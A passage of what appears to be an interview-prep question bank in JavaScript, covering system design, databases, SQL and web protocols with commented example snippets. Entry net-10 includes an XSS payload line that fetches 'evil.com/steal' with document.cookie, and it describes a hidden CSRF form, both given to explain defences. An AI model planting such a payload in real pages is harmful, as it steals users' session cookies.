// Persistence      | None (Volatile RAM)        | Yes (RDB Snapshots / AOF logs)
// Threading Model  | Multi-threaded             | Single-threaded (Event Loop)
// Pub/Sub          | No                         | Yes (Message Broker features)
// typical Use Case | Pure high-speed HTML cache | Caching + Sessions + Queues`
    },
    {
        id: "sys-9",
        category: "System Design",
        question: "Interview Tricky: What is the 'Cache Thundering Herd' (Cache Stampede) problem and how do you fix it?",
        answer: "A Cache Stampede occurs when a highly requested cache key expires simultaneously while under heavy traffic. Thousands of requests instantly miss the cache, hitting the database exactly at the same time, potentially crashing it. You fix it using a Mutex Lock (only allowing one thread to re-compute the DB value while others wait) or Probabilistic Early Expiration.",
        snippet: `// The Thundering Herd Problem:
// 
// 1. Key "Popular_Product" expires at 12:00:00.
// 2. 12:00:01 -> 10,000 users request "Popular_Product".
// 3. Cache Miss for all 10,000 requests.
// 4. All 10,000 requests hit the MongoDB query simultaneously -> DATABASE CRASH.
//
// Mutex Lock Solution (Debouncing):
// if (Cache.get(key) == null) {
//    if (Cache.acquireLock(key)) {
//       let data = DB.query();
//       Cache.set(key, data);
//       Cache.releaseLock(key);
//    } else {
//       wait(50ms) and retry reading Cache.
//    }
// }`
    },
    {
        id: "sys-10",
        category: "System Design",
        question: "How do you scale a database? Explain Master-Slave vs Master-Master Replication.",
        answer: "Replication involves copying data across multiple databases to improve availability and read scaling. In Master-Slave, writes only go to the single Master, which syncs to Read-Only Slaves (solves read-heavy scaling but Master is a SPOF). In Master-Master, any node can accept writes, requiring complex conflict resolution (high availability for both reads/writes but prone to sync collisions).",
        snippet: `// --- Master-Slave (Single Leader) ---
// [ App ] --(Writes/Reads)--> [ Master DB ]
//                               |      |
//                         (async log sync)
//                               v      v
// [ App ] --(Reads Only)---> [ Slave 1 ] [ Slave 2 ]
// * Ideal for: Read-heavy applications (95% Reads / 5% Writes). Like Twitter feeds.

// --- Master-Master (Multi-Leader) ---
// [ App ] --(Writes/Reads)--> [ Master A ] <--(2-way sync)--> [ Master B ] <--(Writes/Reads)-- [ App ]
// * Ideal for: High availability across global regions (e.g., US Master and EU Master).
// * Risk: Split-brain (network failure breaks sync resulting in conflicting data).`
    },
    {
        id: "sys-11",
        category: "System Design",
        question: "Explain Database Sharding (Data Partitioning).",
        answer: "Sharding is horizontal scaling strictly for the database layer. Instead of replicating the entire dataset, you partition (split) the massive SQL/NoSQL table into smaller, independent chunks (shards) spread across entirely different physical DB servers based on a Routing Key (like UserID % N).",
        snippet: `// Horizontal Partitioning (Sharding)
// Problem: 1 Table has 10 Billion Rows. Queries are insanely slow.
// Solution: Split table by routing key.
//
// Routing Logic: shard_id = userID % 3
//
// [ App Router ]
//       |
//       |--- user 1, 4, 7 ---> [ Shard 1 DB (Server A) ]
//       |--- user 2, 5, 8 ---> [ Shard 2 DB (Server B) ]
//       |--- user 3, 6, 9 ---> [ Shard 3 DB (Server C) ]
//
// Cons: 
// 1. Joins across different shards are virtually impossible/devastatingly slow.
// 2. "Celebrity Problem" (Hotspot) - One shard gets 90% of traffic if data is skewed.`
    },
    {
        id: "sys-12",
        category: "System Design",
        question: "What is Database Connection Pooling and why is it mandatory for Backend APIs?",
        answer: "Opening and closing a TCP network connection and completing the DB authentication handshake for every single HTTP request is extremely slow and resource-heavy. A Connection Pool keeps a cache of pre-authenticated, ready-to-use active database connections. When a request comes in, it instantly 'borrows' an idle connection and returns it when finished.",
        snippet: `// Without Pooling (Disaster at Scale):
// Req 1 -> Open TCP -> SSL Handshake -> Auth -> Query -> Close TCP (Takes 200ms)
// Req 2 -> Open TCP -> SSL Handshake -> Auth -> Query -> Close TCP (Takes 200ms)

// With Connection Pooling (Standard):
// Pool: [ IdleConn1, IdleConn2, IdleConn3 ] (Pre-warmed on server boot)
// 
// Req 1 -> Borrows IdleConn1 -> Query -> Returns IdleConn1 to Pool (Takes 5ms)
// Req 2 -> Borrows IdleConn2 -> Query -> Returns IdleConn2 to Pool (Takes 5ms)

// Node.js Postgres (pg) Example:
// const { Pool } = require('pg');
// const pool = new Pool({ max: 20, idleTimeoutMillis: 30000 });
// 
// // The app borrows from the pool automatically:
// const res = await pool.query('SELECT * FROM users WHERE id = $1', [1]);`
    },
    {
        id: "sys-13",
        category: "System Design",
        question: "REST vs GraphQL: When would you use one over the other?",
        answer: "REST uses predefined endpoints returning fixed data structures (Over-fetching/Under-fetching). GraphQL uses a single endpoint where the client explicitly specifies the exact shape of the data it needs. Use REST for simple, cacheable, standardized services. Use GraphQL for complex UIs (like mobile apps) needing aggregated data from multiple microservices simultaneously.",
        snippet: `// --- REST (Multiple Endpoints) ---
// GET /users/123 -> Gets user object
// GET /users/123/posts -> Gets user's posts
// * Rigid. Usually returns more data than needed (Over-fetching).

// --- GraphQL (Single Endpoint) ---
// POST /graphql
// Request Body:
// query {
//   user(id: 123) {
//     name
//     posts {
//       title
//     }
//   }
// }
// * Flexible. Returns exactly \`name\` and \`title\`. No more, no less.`
    },
    {
        id: "sys-14",
        category: "System Design",
        question: "How do you protect your APIs? Explain Rate Limiting and API Versioning.",
        answer: "Rate Limiting restricts the number of requests a user/IP can make in a time window to prevent DDoS attacks or server overload (often implemented via Redis Token Bucket/Leaky Bucket). API Versioning ensures backend updates don't break existing older clients by scoping changes to specific route paths or request headers.",
        snippet: `// --- Rate Limiting (Token Bucket Concept) ---
// [ Client ] --> ( 5 tokens max, refills 1 token/sec ) --> [ API ]
// * If Client makes 6 requests instantly, the 6th is rejected (HTTP 429 Too Many Requests).

// --- API Versioning Strategies ---
// 1. URI Routing (Most Common):
//    GET /api/v1/users (Returns old schema)
//    GET /api/v2/users (Returns new schema with breaking changes)

// 2. Custom Header:
//    GET /api/users
//    Header -> Accept-Version: v2.0`
    },
    {
        id: "sys-15",
        category: "System Design",
        question: "Explain Message Brokers. What are the core differences between RabbitMQ and Apache Kafka?",
        answer: "Message Brokers decouple microservices by allowing them to communicate asynchronously via queues/streams. RabbitMQ is a traditional message queue (Smart Broker, Dumb Consumer) focusing on complex routing and delivering messages once. Kafka is a distributed event streaming platform (Dumb Broker, Smart Consumer) focusing on high-throughput, real-time data ingestion, and retaining a persistent replayable log of events.",
        snippet: `// --- RabbitMQ (Message Queue) ---
// Best for: Transactional, task-based workloads (e.g., sending an email).
// Mechanism: Push-based. The broker pushes messages to consumers.
// State: Once a consumer ACKs the message, RabbitMQ permanently deletes it.
//
// [ Service A ] -> (Exchange -> Queue) -> pushes to -> [ Service B ] (Deletes MSG)

// --- Apache Kafka (Event Stream) ---
// Best for: Enormous data pipelines, analytics, log aggregation.
// Mechanism: Pull-based. Consumers constantly poll the broker for new data.
// State: Messages are persisted on disk for a set time (e.g., 7 days).
// Multiple different services can replay the exact same stream of events.
//
// [ Service A ] -> (Append to Partition Log)
//                      ^          ^
//                      |          |
//                [ Service B ] [ Service C (Replaying from yesterday) ]`
    },

    // --- DATABASE MANAGEMENT SYSTEMS & SQL ---
    {
        id: "dbms-1",
        category: "Database Systems",
        question: "Explain SQL JOINs (INNER, LEFT, RIGHT, FULL OUTER).",
        answer: "JOINs combine rows from two or more tables based on a related column. INNER joins return only matching rows. LEFT joins return all rows from the left table + matching rows from the right (null if no match). RIGHT joins do the reverse. FULL OUTER joins return all rows when there is a match in either table.",
        snippet: `// INNER JOIN: (Intersection)
// Returns mathematically overlapping User & Order data.
// SELECT * FROM Users INNER JOIN Orders ON Users.id = Orders.user_id;

// LEFT JOIN: (Include all Left)
// Returns ALL Users. If a user has an order, it returns it. If not, Order columns = NULL.
// SELECT * FROM Users LEFT JOIN Orders ON Users.id = Orders.user_id;

// FULL OUTER JOIN: (Union)
// Returns everything. Unmatched rows on either side contain NULLs.
// SELECT * FROM Users FULL OUTER JOIN Orders ON Users.id = Orders.user_id;`
    },
    {
        id: "dbms-2",
        category: "Database Systems",
        question: "SQL Functions: GROUP BY, HAVING vs WHERE, Window Functions (ROW_NUMBER).",
        answer: "WHERE filters rows BEFORE grouping. GROUP BY aggregates identical data into summary rows (using SUM/COUNT/AVG). HAVING filters rows AFTER grouping. Window Functions (like ROW_NUMBER, RANK, LAG) perform calculations across a set of table rows directly related to the current row without collapsing them into a single output row.",
        snippet: `// Example: Find departments where the AVERAGE salary is > $50k.
// WHERE cannot be used on an aggregate like AVG()!
//
// SELECT department, AVG(salary) as AvgSal 
// FROM Employees 
// WHERE status = 'active'     <-- Pre-filter
// GROUP BY department         <-- Aggregate
// HAVING AVG(salary) > 50000; <-- Post-filter

// Window Function Example (ROW_NUMBER):
// Assigns a sequential integer to each row within the partition of a result set.
// SELECT id, name, salary, 
//        ROW_NUMBER() OVER (PARTITION BY department ORDER BY salary DESC) as rank
// FROM Employees;`
    },
    {
        id: "dbms-3",
        category: "Database Systems",
        question: "Explain Database Normalization (1NF, 2NF, 3NF). When do you denormalize?",
        answer: "Normalization minimizes data redundancy by splitting large tables into smaller related ones using primary/foreign keys. 1NF: Atomic values (no arrays in columns). 2NF: 1NF + no partial dependencies (every non-key attribute fully depends on the entire primary key). 3NF: 2NF + no transitive dependencies (non-key attributes cannot depend on other non-key attributes). You De-normalize (intentionally duplicate data) when heavy JOINs drastically slow down read performance.",
        snippet: `// --- 1NF Violation (Non-Atomic) ---
// User | PhoneNumbers (Array)
// John | [555-1234, 555-9876]
// Fix: Create separate 'UserPhones' table with 1 phone number per row.

// --- 3NF Transitive Violation ---
// OrderID | CustomerID | CustomerZipCode | CustomerState
// Issue: 'CustomerState' inherently depends on 'CustomerZipCode', not just the 'OrderID'.
// Fix: Move ZipCode/State to a distinct 'Location' table mapped by CustomerID.

// Denormalization:
// Sometimes joining Users -> Orders -> Items -> Products takes 500ms.
// Denormalization intentionally adds the Product Name directly to the Orders table to skip the join.`
    },
    {
        id: "dbms-4",
        category: "Database Systems",
        question: "Explain B-Tree Indexes vs Hash Indexes. What are Clustered vs Non-Clustered Indexes?",
        answer: "B-Tree indexes sort data hierarchically allowing incredibly fast range queries (WHERE age > 20). Hash indexes map keys directly to O(1) locations but only support equality queries (WHERE age = 20). A Clustered Index literally determines the physical sort order of rows on the hard drive (only 1 per table, usually Primary Key). A Non-Clustered Index stores logical pointers pointing precisely back to the physical data rows (you can have many).",
        snippet: `// B-Tree Architecture (O(log n) lookup):
//          [ 50 ]
//         /      \\
//     [ 20 ]    [ 80 ]
//      /  \\      /  \\
//   [10] [30]  [60] [90]  <-- Leaf nodes physically point to the data.

// Index Downside:
// 1. Every time you INSERT/UPDATE/DELETE data, the DB must physically update the B-Tree index. 
// 2. Indexes massively speed up Reads, but noticeably slow down Writes.
// 3. DO NOT index every column. Only index heavily searched foreign keys or WHERE clauses.`
    },
    {
        id: "dbms-5",
        category: "Database Systems",
        question: "Describe ACID properties in Database Transactions. What are Isolation Levels?",
        answer: "ACID ensures transaction safety. Atomicity (All or Nothing: if 1 step fails, roll back completely). Consistency (Data must meet schema rules/constraints). Isolation (Parallel transactions don't interfere with each other). Durability (Committed data survives physical power loss). Isolation Levels control the strictness of parallel reads: Read Uncommitted, Read Committed, Repeatable Read, and Serializable.",
        snippet: `// Transaction Flow (Atomicity)
// BEGIN TRANSACTION;
// UPDATE Accounts SET balance = balance - 100 WHERE id = 'A';
// UPDATE Accounts SET balance = balance + 100 WHERE id = 'B';
// COMMIT; (If server crashes mid-way, DB rolls back both).

// Isolation Dirty Read Problem (Level: Read Uncommitted):
// Transaction 1 updates A's balance but hasn't committed yet.
// Transaction 2 reads A's new balance.
// Transaction 1 encounters an error and ROLLS BACK.
// Transaction 2 now possesses invalid "Dirty" data that never actually existed!
// Fix: Set level to "Read Committed" (default in Postgres).`
    },
    {
        id: "dbms-6",
        category: "Database Systems",
        question: "Explain Concurrency Control & The N+1 Query Problem.",
        answer: "Concurrency Control manages simultaneous DB access using Lock mechanisms: Shared Locks allow parallel reads but block writes, Exclusive Locks block both reads and writes. Optimistic Locking assumes no conflicts and checks versions before saving; Pessimistic physically locks the row immediately. N+1 Problem is a performance flaw where grabbing a list of parents (1 query) triggers a separate single query for each child's data (N queries).",
        snippet: `// Pessimistic Lock (Row Level) - Prevents others from touching it:
// SELECT * FROM Tickets WHERE status = 'available' LIMIT 1 FOR UPDATE;
// (Locks the exact ticket row purely for the current transaction until COMMIT).

// N+1 Problem Execution (ORM Flaw):
// const users = await User.find();      // 1 Query (Returns 100 users)
// for(let user of users) {
//    console.log(await user.getPosts()) // 100 Individual Queries! (N queries)
// }
// TOTAL DANGER: 101 database queries executed.

// Solution: Eager Loading / Joins (Executes in exactly 2 queries combined)
// const users = await User.find({ include: 'posts' });`
    },
    {
        id: "dbms-7",
        category: "Database Systems",
        question: "Explain CAP Theorem & SQL vs NoSQL. When to use which?",
        answer: "CAP Theorem states a distributed data store can only provide two of three guarantees: Consistency (all nodes see the exact same data simultaneously), Availability (every request receives a response quickly), and Partition Tolerance (system continues despite network drop/split). SQL is ACID-compliant (CA/CP focused) strictly utilizing structured relations. NoSQL is loosely structured (AP focused - Eventual Consistency) prioritizing massive horizontal scale.",
        snippet: `// When to use Relational SQL (Postgres, MySQL):
// 1. Data has strict schema structures & requires high data integrity (Banking).
// 2. Heavy multi-table relationship JOINs.
// 3. ACID transactional guarantees are critical.

// When to use NoSQL (MongoDB, DynamoDB, Cassandra):
// 1. Data schema is entirely unpredictable or rapidly changing (IoT sensors, JSON payloads).
// 2. Need to infinitely scale Horizontally across global clusters instantly.
// 3. Storing heavily nested JSON objects natively.

// NoSQL Types:
// Document: MongoDB (Stores nested JSON-like BSON logic)
// Key-Value: Redis (Stores pure strings in RAM)
// Column: Cassandra (Stores data dynamically in massive sparse columns, high write speed)
// Graph: Neo4j (Stores natively linked node-relationships mapping social networks)`
    },

    // --- COMPUTER NETWORKS & PROTOCOLS ---
    {
        id: "net-1",
        category: "Computer Networks & Protocols",
        question: "Explain the core HTTP Methods: GET, POST, PUT, DELETE, and PATCH.",
        answer: "GET retrieves data (should be idempotent and read-only). POST creates a new resource (not idempotent). PUT completely replaces an existing resource (if it doesn't exist, it creates it). PATCH partially updates an existing resource (modifying only specific fields). DELETE completely removes a resource.",
        snippet: `// --- HTTP Method Semantics ---

// GET /api/users/123
// Safe & Idempotent (Calling it 10x yields the same DB state).
// Never send sensitive data in a GET URL query string.

// POST /api/users
// Body: { name: 'Alice' }
// NOT Idempotent (Calling it 10x creates 10 different Alices).

// PUT /api/users/123
// Body: { name: 'Alice', age: 30 }
// Overwrites the ENTIRE user object. Replaces missing fields with Null.

// PATCH /api/users/123
// Body: { age: 31 }
// ONLY updates the age field. Leaves 'name' and other fields untouched.`
    },
    {
        id: "net-2",
        category: "Computer Networks & Protocols",
        question: "Explain the importance of standard HTTP Status Codes (2xx, 4xx, 5xx).",
        answer: "Status codes instantly inform the client of the result without parsing the body. 2xx indicates Success (200 OK, 201 Created). 4xx indicates Client Errors (400 Bad Request, 401 Unauthorized [needs login], 403 Forbidden [lacks admin role], 404 Not Found). 5xx indicates Server Errors (500 Internal Error, 502 Bad Gateway).",
        snippet: `// Express.js Status Code Examples:

// 201 Created (Perfect for successful POSTs)
// res.status(201).json({ message: "User successfully registered" });

// 400 Bad Request (Client sent invalid data/missing fields)
// res.status(400).json({ error: "Password must be > 8 chars" });

// 401 Unauthorized vs 403 Forbidden
// 401: "I don't know who you are. Please log in."
// 403: "I know who you are, but you aren't an Admin so you can't view this."

// 500 Internal Server Error (Uncaught exception in DB/Backend logic)
// console.error(error);
// res.status(500).json({ error: "Database connection failed" });`
    },
    {
        id: "net-3",
        category: "Computer Networks & Protocols",
        question: "What are HTTP Headers? Describe Authorization, Content-Type, and Cache-Control.",
        answer: "Headers are key-value string pairs sent in the HTTP request/response carrying metadata. Authorization carries credentials (like a Bearer JWT). Content-Type tells the receiver how to parse the body (e.g., application/json or multipart/form-data). Cache-Control dictates caching policies for proxies and browsers (e.g., max-age=3600).",
        snippet: `// Standard Client Request Headers:
// GET /api/dashboard HTTP/1.1
// Host: api.example.com
// Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI...  <-- The JWT Token
// Accept: application/json
// User-Agent: Mozilla/5.0...

// Standard Server Response Headers:
// HTTP/1.1 200 OK
// Content-Type: application/json; charset=utf-8      <-- "Parse my body as JSON"
// Cache-Control: public, max-age=86400               <-- "Browser, cache this for 1 day"
// Set-Cookie: sessionID=abc1234; HttpOnly; Secure    <-- Secures auth cookie`
    },
    {
        id: "net-4",
        category: "Computer Networks & Protocols",
        question: "Compare HTTP vs HTTPS and HTTP/1.1 vs HTTP/2.",
        answer: "HTTP sends data in pure plaintext. HTTPS encrypts the connection using TLS/SSL, ensuring data privacy and preventing Man-in-the-Middle attacks. HTTP/1.1 is strictly synchronous, opening one TCP connection per asset. HTTP/2 introduces Multiplexing (sending multiple assets over a single TCP connection concurrently), Header Compression (HPACK), and Server Push.",
        snippet: `// Why HTTP/2 is drastically faster for Web Apps:

// --- HTTP/1.1 (Head-of-Line Blocking) ---
// TCP Connection 1: Sends HTML
// TCP Connection 2: Sends CSS
// TCP Connection 3: Sends JS (Fails) <-- Everything halts waiting for this.
// Browsers limit max ~6 TCP connections per domain.

// --- HTTP/2 (Multiplexed Streams) ---
// Single TCP Connection:
//  [ Frame: CSS Chunk 1 ] [ Frame: JS Chunk 1 ] [ Frame: Image Chunk 1 ]
//  [ Frame: CSS Chunk 2 ] [ Frame: JS Chunk 2 ] [ Frame: Image Chunk 2 ]
// Data is interleaved in binary frames asynchronously avoiding the bottleneck.`
    },
    {
        id: "net-5",
        category: "Computer Networks & Protocols",
        question: "Authentication State: Cookies vs Sessions vs Tokens (JWT).",
        answer: "Cookies are small string files stored entirely on the Client browser, passed automatically on every request. Sessions are completely Stateful: the Server stores the user's data locally in RAM/Redis, and only gives the Client a tiny reference 'SessionID'. Tokens (JWTs) are completely Stateless: the Server cryptographically signs the user's data directly into the Token, gives it to the Client, and requires zero database lookups to verify identity later.",
        snippet: `// Authentication Evolution

// 1. Session Architecture (Stateful)
// - Client POST Login
// - Server creates { sessionID: "XYZ", user: "Alice" } and saves to Redis.
// - Server sends "Set-Cookie: sessionID=XYZ"
// - Client sends Cookie next request -> Server checks Redis for XYZ -> OK.
// * Hard to scale horizontally.

// 2. JWT Architecture (Stateless)
// - Client POST Login
// - Server hashes { user: "Alice" } with a SECRET_KEY = JWT_String.
// - Server sends JWT_String to Client (stored in localStorage or HttpOnly Cookie).
// - Client sends JWT in "Authorization: Bearer" header.
// - Server does math to verify the signature. NO DB/REDIS lookup required!
// * scales infinitely.`
    },
    {
        id: "net-6",
        category: "Computer Networks & Protocols",
        question: "Explain RESTful API principles (Statelessness, Client-Server, Uniform Interface).",
        answer: "REST (Representational State Transfer) is an architectural style. Core constraints: 1. Client-Server (separation of UI concerns from data storage). 2. Statelessness (no client context is stored on the server between requests; every request must contain all info needed to understand it). 3. Uniform Interface (resources are identified in requests via standard URIs). 4. Cacheability.",
        snippet: `// Understanding Statelessness
//
// ❌ BAD (Stateful): 
// Request 1: POST /api/login -> Server creates auth session in RAM.
// Request 2: GET  /api/profile -> Server remembers Request 1. (Will fail if routed to a different server instance).
//
// ✅ GOOD (Stateless REST):
// Request 1: POST /api/login -> Returns Bearer Token.
// Request 2: GET  /api/profile (Header: Auth Bearer Token) -> Server immediately verifies cryptographically without checking RAM.`
    },
    {
        id: "net-7",
        category: "Computer Networks & Protocols",
        question: "What are Resource-Based URLs and Idempotency in REST?",
        answer: "Resource-based URLs name the 'thing' (noun) you are interacting with, rather than the action (verb). Idempotency means that making multiple identical requests has the same effect on the server state as making a single request (GET, PUT, DELETE are idempotent; POST is not).",
        snippet: `// Resource-Based Naming Conventions
//
// ❌ BAD (RPC / Action-based):
// GET /getUsers
// POST /createUser
// POST /deleteUser?id=5
//
// ✅ GOOD (REST / Resource-based Nouns):
// GET    /api/users       (Fetch list)
// POST   /api/users       (Create one)
// GET    /api/users/5     (Fetch specific user)
// PUT    /api/users/5     (Completely overwrite user 5 - Idempotent)
// DELETE /api/users/5     (Delete user 5 - Idempotent)`
    },
    {
        id: "net-8",
        category: "Computer Networks & Protocols",
        question: "Explain Web Security Basics: SSL/TLS and JWT.",
        answer: "SSL (Secure Sockets Layer) and its successor TLS (Transport Layer Security) encrypt the communication channel between client and server using asymmetric cryptography (public/private keys) during the handshake, then switching to symmetric encryption for speed. JWT (JSON Web Token) is a standard for securely transmitting JSON data as a cryptographically signed token.",
        snippet: `// TLS Handshake Flow (Simplified)
// 1. Client: "Hello, I want to connect securely. Here are my cipher suites."
// 2. Server: "Hello. I chose AES-256. Here is my Public SSL Certificate."
// 3. Client: Verifies Certificate with Root CA. Generates a symmetric 'Session Key', encrypts it with Server's Public Key, and sends it.
// 4. Server: Decrypts Session Key using its highly guarded Private Key.
// 5. Connection uses the blazing-fast symmetric Session Key from now on.

// JWT Structure (Header . Payload . Signature)
// eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VySWQiOjEyM30 . SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
    },
    {
        id: "net-9",
        category: "Computer Networks & Protocols",
        question: "Describe the OAuth 2.0 Authorization Code Flow.",
        answer: "OAuth 2.0 is an authorization framework (not authentication, though often used for it via OIDC). It allows a user to grant a third-party application limited access to their resources on another site without sharing their password.",
        snippet: `// OAuth 2.0 (e.g., "Login with Google")
//
// 1. You click "Login with Google" on MyApp.com.
// 2. MyApp redirects you to accounts.google.com with MyApp's Client ID.
// 3. You log in to Google and click "Allow MyApp to read my email".
// 4. Google redirects you back to MyApp with a short-lived "Authorization Code" in the URL.
// 5. MyApp's Backend takes that Code + its secret Client Secret, and POSTs directly to Google's backend.
// 6. Google verifies the Code/Secret and responds with an Access Token.
// 7. MyApp backend uses the Access Token to fetch your email from Google's API.`
    },
    {
        id: "net-10",
        category: "Computer Networks & Protocols",
        question: "What are CORS, CSRF, and XSS?",
        answer: "CORS (Cross-Origin Resource Sharing) is a browser security mechanism that blocks requests made to a different domain unless the server explicitly allows it. CSRF (Cross-Site Request Forgery) tricks an authenticated user into executing unwanted actions (prevented via CSRF Anti-forgery tokens). XSS (Cross-Site Scripting) is injecting malicious client-side JavaScript into a website to steal cookies/tokens (prevented by sanitizing inputs and using HttpOnly cookies).",
        snippet: `// 1. CORS Scenario:
// Frontend runs on localhost:3000. API runs on localhost:5000.
// Browser blocks the fetch() request unless localhost:5000 explicitly sends header:
// Access-Control-Allow-Origin: http://localhost:3000

// 2. CSRF Attack:
// You are logged into Bank.com.
// You visit Evil.com. Evil.com contains a hidden form that auto-submits a POST request to Bank.com/transfer?amount=1000.
// Because you are logged in, your browser attaches the Bank.com auth cookies automatically!
// Fix: Require a hidden CSRF token generated by the server that Evil.com cannot guess.

// 3. XSS Attack:
// Attacker submits a comment: "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>"
// Unprotected React/HTML renders it. Every user viewing the comment has their cookies stolen.
// Fix: Never dangerously set innerHTML. Sanitize all markdown/text inputs. Use 'HttpOnly' flag on auth cookies (preventing JS access).`
    },
    {
        id: "sys-16",
        category: "System Design",
        question: "Architecture Patterns: Monolith vs Microservices.",
        answer: "A Monolith deploys the entire application (UI, Business Logic, DB logic) as a single tightly-coupled codebase. Microservices break the application into small, independent, loosely coupled services communicating via networks (HTTP/gRPC), allowing independent scaling, diverse tech stacks, and team autonomy at the cost of network complexity and data consistency challenges.",
        snippet: `// --- The Monolith ---
// [ Web Server ] -> Contains: (Users + Orders + Inventory + Payments)
// Pros: Easy to debug, easy to deploy, fast internal function calls.
// Cons: Changing 1 line of 'Payments' code requires redeploying the entire app.
//       If 'Inventory' crashes due to memory leak, the whole app dies.

// --- Microservices Architecture ---
// [ Auth Service (Node) ]    -> [ MongoDB ]
// [ Order Service (Java) ]   -> [ Postgres ]
// [ Search Service (Go) ]    -> [ ElasticSearch ]
// Pros: Independent scaling (Scale ONLY Orders during Black Friday).
// Cons: Complex distributed transactions (Sagas), network latency, tracing.`
    },
    {
        id: "sys-17",
        category: "System Design",
        question: "Explain Serverless Architecture and Service Mesh.",
        answer: "Serverless (AWS Lambda) abstracts server provisioning away; code runs in ephemeral containers triggered by events, billing only for exact execution milliseconds. A Service Mesh (Istio/Linkerd) is an infrastructure layer for Microservices that handles service-to-service communication, sidecar proxies, load balancing, mutual TLS encryption, and observability without altering application code.",
        snippet: `// --- Serverless Execution Flow ---
// User Uploads Image -> S3 Bucket Event Trigger -> [ AWS Lambda Starts ]
// -> Lambda Resizes Image -> Saves to DB -> [ Lambda Dies, Billing Stops ]
// * Pros: Infinite auto-scaling, no idle server costs.
// * Cons: "Cold Starts" (delay when spinning up a dormant container), Vendor Lock-in.

// --- Service Mesh (Sidecar Pattern) ---
// Instead of Service A managing retries/certs/metrics to talk to Service B:
// [ Service A ] <-> (Sidecar Proxy) =====NETWORK===== (Sidecar Proxy) <-> [ Service B ]
// The sidecars handle all the complex networking logic transparently.`
    },
    {
        id: "sys-18",
        category: "System Design",
        question: "What are Event Sourcing and CQRS (Command Query Responsibility Segregation)?",
        answer: "Event Sourcing stores the state of a system as a strict sequence of immutable state-changing events rather than just saving the current state (like a bank ledger). CQRS splits the application into two completely separate models/databases: one strictly for handling Commands (Writes/Updates) and one specifically optimized for handling Queries (Reads). Often used together.",
        snippet: `// --- Event Sourcing Example (Bank Account) ---
// ❌ Traditional DB: { id: 1, balance: 50 }  (Lose history of HOW we got 50)
// 
// ✅ Event Source Ledger:
// Event 1: { type: 'ACCOUNT_OPENED', balance: 0 }
// Event 2: { type: 'DEPOSITED', amount: 100 }
// Event 3: { type: 'WITHDREW', amount: 50 }
// Total State (Rehydrated by replaying events): 50.

// --- CQRS Architecture ---
//                     /-> [ Command Handler ] -> writes -> [ Write DB (Highly Normalized SQL) ] 
// [ Client Request ] -                | (async event trigger)
//                     \\-> [ Query Handler ]   <- reads  <- [ Read DB (Denormalized NoSQL/Elastic) ]
// * Ideal for heavy read-intensive systems where reads vastly outnumber writes.`
    }
];
